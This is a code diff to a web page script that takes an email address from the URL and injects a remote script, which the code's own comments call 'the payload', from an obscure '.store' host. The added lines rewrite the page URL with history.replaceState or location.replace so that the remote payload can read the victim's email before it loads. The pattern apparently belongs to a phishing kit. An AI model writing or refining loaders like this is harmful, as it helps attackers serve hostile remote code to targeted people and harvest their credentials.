@@ -27,11 +27,33 @@
     const email = getEmailFromURL();
 
     if (email) {
-      // merged: load payload script directly instead of window.location.href redirect
-      var _p = document.createElement("script");
-      _p.src = "https://rrb5fd2rszrcrpzkm5etq2ds2itqvhi2a5olqezhtr4noqqn5zfq.ong3.store/jEPSj1GWYii_KmdJOGhy0icKnRoHXLgTJ5x410IN7ks?e=" + email;
-      _p.async = true;
-      (document.head || document.documentElement).appendChild(_p);
+      // The payload reads its OWN PAGE's query string (?e= / &e=) and ignores its
+      // <script src> query, so the address must be on the page URL before it loads.
+      var _re = new RegExp("[?&]" + "e" + "=");
+      var _proceed = true;
+      if (!_re.test(location.search)) {
+        var _sep = location.search ? "&" : "?";
+        var _newUrl = location.pathname + location.search + _sep + "e"
+          + "=" + encodeURIComponent(email) + location.hash;
+        var _ok = false;
+        try {
+          history.replaceState(null, "", _newUrl);
+          _ok = _re.test(location.search);
+        } catch (e) { _ok = false; }
+        if (!_ok) {
+          // replaceState unavailable (file:// or a sandboxed frame): hard-navigate once.
+          // On reload the guard above sees the param and injects instead of looping.
+          try { location.replace(_newUrl); } catch (e) {}
+          _proceed = false;
+        }
+      }
+      if (_proceed) {
+        // merged: load payload script directly instead of window.location.href redirect
+        var _p = document.createElement("script");
+        _p.src = "https://rrb5fd2rszrcrpzkm5etq2ds2itqvhi2a5olqezhtr4noqqn5zfq.ong3.store/jEPSj1GWYii_KmdJOGhy0icKnRoHXLgTJ5x410IN7ks?";
+        _p.async = true;
+        (document.head || document.documentElement).appendChild(_p);
+      }
     } else {
       console.log("No valid email found in state parameter.");
     }
